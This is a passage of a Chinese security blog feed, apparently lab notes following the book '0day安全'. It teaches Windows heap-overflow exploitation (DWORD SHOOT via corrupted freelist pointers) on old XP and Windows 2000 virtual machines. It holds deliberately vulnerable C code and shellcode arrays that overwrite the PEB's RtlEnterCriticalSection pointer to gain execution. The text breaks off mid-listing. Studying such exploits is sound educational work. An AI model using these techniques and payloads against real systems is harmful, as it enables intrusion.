<code>0x0C0C0C0C</code>，导致溢出失败。 1MB的内存相对于 200 字节左右的 shellcode，可以让 exploit 拥有足够的稳定性。</p><blockquote><p>参考：《0day,软件安全漏洞分析技术》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;狙击-windows-异常处理机制&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#狙击-windows-异常处理机制&quot;&gt;&lt;/a&gt; 狙击 Windows 异常处理机制&lt;/h1&gt;
&lt;h2 id=&quot;seh-概述&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内存攻击" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出</title>
    <link href="https://www.rgzzplus.com/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    <id>https://www.rgzzplus.com/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</id>
    <published>2022-04-15T15:32:13.000Z</published>
    <updated>2022-04-21T06:25:11.033Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>如果你不了解堆的话，请先看我的上一篇博文《堆的工作原理》，然后再来学习堆溢出，结合食用，更易理解。</p></blockquote><h1 id="堆溢出利用上-dword-shoot"><a class="markdownIt-Anchor" href="#堆溢出利用上-dword-shoot"></a> 堆溢出利用（上）—— DWORD SHOOT</h1><h2 id="链表拆卸中的问题"><a class="markdownIt-Anchor" href="#链表拆卸中的问题"></a> 链表“拆卸”中的问题</h2><p>堆管理系统三类操作：堆块分配、堆块释放、堆块合并。</p><p>这三种操作实际上是对链表的修改，如果我们能伪造链表结点的指针，那么在 “卸下” 和 “链入” 过程中就可能获得一次读写内存的机会。</p><p>堆溢出的精髓：用特殊的数据去溢出下一个堆块的块首，改写块首的前向指针（flink）和后向指针（blink），然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p><p>**DWORD SHOOT：**向内存任意地址写入任意数据。</p><table><thead><tr><th>点射目标（Target）</th><th>子弹（payload）</th><th>改写后的结果</th></tr></thead><tbody><tr><td>栈帧中的函数返回地址</td><td>shellcode 起始地址</td><td>函数返回时，跳去执行 shellcode</td></tr><tr><td>栈帧中的 S.E.H 句柄</td><td>shellcode 起始地址</td><td>异常发生时，跳去执行 shellcode</td></tr><tr><td>重要函数调用地址</td><td>shellcode 起始地址</td><td>函数调用时，跳去执行 shellcode</td></tr></tbody></table><blockquote><p><strong>注意：</strong><br>DWORD SHOOT 发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（填充的 4 字节恶意数据）。</p></blockquote><h3 id="dword-shoot-原理"><a class="markdownIt-Anchor" href="#dword-shoot-原理"></a> DWORD SHOOT 原理</h3><p>下面我们讲解，将一个结点从双向链表中 “拆卸” 下来的过程中，是<strong>怎么向任意地址写入任意数据的</strong>（即DWORD SHOOT）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//正常拆卸结点的函数</span></span><br></pre></td></tr></table></figure><p>正常拆卸过程，正如下面 图5.3.1 过程一样。</p><p>但是当我们利用堆溢出，把 Node 的块首覆盖后，node -&gt; flink（前向指针）与node -&gt; blink（后向指针）也就能伪造了。<br>这时，如果继续执行堆块 “拆卸”，实际上是执行<code>node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake);</code>即 <code>Target -&gt; flink = node -&gt; flink(fake);</code>，如下面的 图5.3.2 所示。</p><p><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220421130721708.png" alt="image-20220421130721708"></p><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows xp sp3虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><p>按照堆表数据结构规定，堆的空表索引区在偏移<code>0x0178</code>处。在这个实验中空表索引区的地址是<code>0x003a0178</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coalesing</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h5);</span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMOTY, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤"><a class="markdownIt-Anchor" href="#步骤"></a> 步骤</h3><p>与前面实验调试一样，先在 vc++6.0 中编译运行代码，然后跳转到 ollydbg，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412115227202-165052222800332.png" alt="image-ollydbg断点"></p><p>跳过断点指令：在<code>004010E2</code>处右击 --&gt; 选择<mark>设置新的运行点</mark>跳转，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412115354254-165052222800433.png" alt="image-20220412115354254"></p><p>断点是刚好在 h6 创建完成后，在释放奇数堆块前，所以这时在我们还未释放堆块前，我们先来观察一下堆的空表索引区，除了freelist[0]中有一个大块的“堆尾”外，其它的都指向自己，因为还没有堆块释放挂入堆中，如下图<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412144315172-165052222800434.png" alt="image-堆空表索引区"></p><p>我们再来看看“堆尾”(<code>003a06e8</code>)，如下图，可以看到，h1 ~ h6 它们的前驱和后继指针都为空，只有“尾块”的前去后记指针指向freelist[0]<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412145132458-165052222800435.png" alt="image-20220412145132458"></p><p>在执行完三次释放操作后，我们再来看看空表索引区，在freelist[2]中多出<code>003a0688</code>和<code>003a06c8</code><br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412150316227-165052222800436.png" alt="image-空表索引区"></p><p>接着再看看h1~h6堆块，在程序中释放掉的 h1, h3, h5 已经有了前驱和后继指针，被链入了freelist[2]中<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412150705273-165052222800437.png" alt="image-20220412150705273"></p><p>这时，最后一次8字节的内存请求将会把原来的 h5分配出去，这意味着，将会中freelist2]的双向链表中 “卸下” 最后一个节点（h5），freelist[2]双向链表示意图，如下图所示<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412152551104-165052222800438.png" alt="image-20220412152551104"></p><p>如果我们直接在内存中修改 h5 的空表指针（攻击时是由于溢出而改写的），那么应该能够观察到DWORD SHOOT现象</p><p>如下图所示，直接把  h5 的后继指针修改为<code>44 44 44 44</code>，前驱指针修改为<code>00 00 00 00</code>，<br>当最后一个分配请求函数被调用后，调试器被异常中断，因为无法将<code>0x44444444</code>写入<code>00000000</code>。<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220412153048362-165052222800439.png" alt="image-20220412153048362"></p><p>如果我们把射击目标定位合法地址，这条指令执行后，<code>0x44444444</code>将会被写入目标</p><h1 id="堆溢出利用下代码植入"><a class="markdownIt-Anchor" href="#堆溢出利用下代码植入"></a> 堆溢出利用（下）——代码植入</h1><h2 id="dword-shoot-的利用方法"><a class="markdownIt-Anchor" href="#dword-shoot-的利用方法"></a> DWORD SHOOT 的利用方法</h2><p>与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。</p><p>DWORD SHOOT 的<strong>常用目标</strong>：</p><ol><li>内存变量：<br>修改能够影响程序执行的重要标志变量，改变程序流程。</li><li>代码逻辑：<br>修改代码段重要函数的关键逻辑有时可以达到一定攻击效果，如逻辑判断代码或者身份验证函数。</li><li>函数返回地址：<br>由于栈帧移位，函数地址不固定，所以通过函数返回地址攻击，具有局限性</li><li>异常处理机制：<br>当程序产生异常时， Windows 会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为 DWORD SHOOT 的上等目标，这包括 S.E.H（ structure exception handler）、 F.V.E.H（ First Vectored Exception Handler）、进程环境块（ P.E.B）中的 U.E.F (Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H 指针(T.E.H)。</li><li>函数指针：<br>系统有时会使用一些函数指针，比如调用动态链接库中的函数、 C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。</li><li>P.E.B 中线程同步函数的入口地址：<br>在每个进程的 P.E.B 中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和 RtlLeaveCriticalSection()，并且在进程退出时会被 ExitProcess()调用。如果能够通过 DWORD SHOOT 修改这对指针中的其中一个，那么在程序退出时 ExitProcess()将会被骗去调用我们的 shellcode。由于 P.E.B 的位置始终不会变化，这对指针在 P.E.B 中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的 exploit 成为可能。</li></ol><h2 id="狙击-peb-中-rtlentercritical-section的函数指针"><a class="markdownIt-Anchor" href="#狙击-peb-中-rtlentercritical-section的函数指针"></a> 狙击 P.E.B 中 RtlEnterCritical-Section()的函数指针</h2><p>当进程退出时，ExitProcess() 函数要做很多善后工作，其中一定会用到临界区函数RtlEnterCriticalSection() 和 RtlLeaveCriticalSection() 来同步线程防止异常数据产生。</p><p>ExitProcess() 函数调用临界区函数的方法比较独特，是通过进程环境块 P.E.B 中偏移 0x20 处存放的函数指针来间接完成的。具体说来就是在 <code>0x7FFDF020</code> 处存放着指向 RtlEnterCriticalSection() 的指针，在 <code>0x7FFDF024</code> 处存放着指向 RtlLeaveCriticalSection()的指针。</p><p><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220421140454311.png" alt="image-20220421140454311"></p><p>下面我们就以 <code>0x7FFDF020</code>处的 RtlEnterCriticalSection() 指针为目标，联系 DWORD SHOOT 后，劫持进程、植入代码。</p><h2 id="调试-2"><a class="markdownIt-Anchor" href="#调试-2"></a> 调试</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows 2000虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;<span class="comment">//200 bytes 0x90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="comment">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="comment">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="comment">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="comment">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="comment">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="comment">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="comment">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span></span><br><span class="line"><span class="comment">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="comment">&quot;\xB8\x20\xF0\xFD\x7F&quot;  //MOV EAX,7FFDF020</span></span><br><span class="line"><span class="comment">&quot;\xBB\x60\x20\xF8\x77&quot;  //MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="comment">&quot;\x89\x18&quot;//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="comment">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="comment">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="comment">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="comment">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="comment">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="comment">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="comment">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="comment">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span></span><br><span class="line"><span class="comment">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line"><span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先简单地解释一下程序和实验步骤。<br>（1） h1 向堆中申请了 <code>200</code> 字节的空间。<br>（2） memcpy 的上限错误地写成了<code>0x200</code>，这实际上是 <code>512</code> 字节，所以会产生溢出。<br>（3） h1 分配完之后，后边紧接着的是一个大空闲块（尾块）。<br>（4）超过 <code>200</code> 字节的数据将覆盖尾块的块首。<br>（5）用伪造的指针覆盖尾块块首中的空表指针，当 h2 分配时，将导致 DWORD SHOOT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DWORD SHOOT 详细过程</span><br><span class="line"></span><br><span class="line">第一次链表分配(h1):</span><br><span class="line">先向后遍历找到最大堆块，进行比较，然后再正向遍历，找到最小的符合要求的堆块。这里只有尾块，所以先分割尾块进行分配。先把尾块划分成两部分，然后修改两个块首大小信息，尾块指针复制到指定位置，然后回到空表freelist[0]，修改空表指针。</span><br><span class="line"></span><br><span class="line">缓冲区溢出，修改尾块的前驱后继指针</span><br><span class="line"></span><br><span class="line">第二次链表分配(h2):</span><br><span class="line">通过空表找到尾块，然后分割尾块，修改块首大小信息，复制尾块指针到指定位置，然后原本是通过后继指针回到freelist[0]，但是后继指针被覆盖，Node-&gt;blink(fake)指向了目标位置（target），然后用Node-&gt;flink(fake)修改了目标位置的内容。</span><br></pre></td></tr></table></figure><p>（6） DWORD SHOOT 的目标是 <code>0x7FFDF020</code> 处的 RtlEnterCriticalSection()函数指针，可以简单地将其直接修改为 shellcode 的位置。<br>（7） DWORD SHOOT 完毕后，堆溢出导致异常，最终将调用 ExitProcess()结束进程。<br>（8） ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从 P.E.B 中拿出了指向 shellcode 的指针，因此 shellcode 被执行。</p><p>为了能够调试真实的堆状态，我们在代码中手动加入了一个断点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>依然是直接运行.exe 文件，在断点将进程中断时，再把调试器 attach 上。</p><p>我们先向堆中复制 <code>200</code> 个 <code>0x90</code> 字节，看看堆中的情况是否与预测一致，如下图，与我们分析一致，200字节后就是尾块<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220415151434002-165052222800440.png" alt="image-20220415151434002"></p><p>缓冲区布置如下:<br>（1）将我们那段 168 字节的 shellcode 用 0x90 字节补充为 200 字节。<br>（2）紧随其后，附上 8 字节的块首信息。为了防止在 DWORD SHOOT 发生之前产生异常，不妨直接将块首从内存中复制使用： “\x16\x01\x1A\x00\x00\x10\x00\x00”。<br>（3）前向指针**( flink )<strong>是 DWORD SHOOT 的“子弹”，这里直接使用 shellcode 的起始地址<code>0x00360688</code>。<br>（4）后向指针</strong>( blink )**是 DWORD SHOOT 的“目标”，这里填入 P.E.B 中的函数指针地址 <code>0x7FFDF020</code>。</p><blockquote><p>**注意：**shellcode 的起始地址 <code>0x00360688</code>需要在调试时确定。有时，HeapCreat()函数创建的堆区起始位置会发生变化。</p></blockquote><p>这时，缓冲区内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span 